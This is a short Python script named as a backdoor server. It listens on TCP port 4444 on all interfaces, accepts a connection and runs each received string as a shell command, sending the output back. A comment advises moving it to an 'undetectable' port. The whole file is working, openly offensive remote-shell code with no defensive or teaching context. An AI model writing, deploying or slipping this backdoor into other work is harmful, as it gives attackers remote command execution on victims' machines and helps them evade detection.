import socket
import subprocess

def start_backdoor_server():
    host = '0.0.0.0'
    port = 4444  # Change this to a high and undetectable port number

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)

    print(f"[*] Listening on {host}:{port}")

    client_socket, addr = server.accept()
    print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")

    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == 'exit':
            break

        output = subprocess.getoutput(command)
        client_socket.send(output.encode())

    client_socket.close()
    server.close()

if __name__ == "__main__":
    start_backdoor_server()